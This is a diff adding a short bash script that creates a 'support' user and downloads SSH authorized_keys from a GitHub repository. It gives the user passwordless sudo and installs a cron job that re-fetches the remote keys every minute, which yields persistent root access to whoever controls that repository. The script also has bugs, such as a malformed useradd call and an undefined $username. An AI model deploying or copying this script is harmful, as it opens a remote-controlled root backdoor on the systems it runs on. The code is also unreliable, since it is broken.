@@ -1,0 +1,11 @@
+#!/bin/bash
+cat /etc/passwd | grep 'support'
+if [ $? == 1 ]; then
+useradd -m -s support
+mkdir /home/support/.ssh
+curl https://raw.githubusercontent.com/fl-em/fl-ssh-key-mgt-test/refs/heads/main/authorized_keys -o /home/support/.ssh/authorized_keys
+echo 'export PS1="\u@\h:\w\$ "' >> "/home/$username/.bashrc"
+chown -R "support:support" "/home/support"
+echo "support ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+echo "* * * * * support curl https://raw.githubusercontent.com/fl-em/fl-ssh-key-mgt-test/refs/heads/main/authorized_keys -o /home/support/.ssh/authorized_keys" >> /etc/crontab
+fi
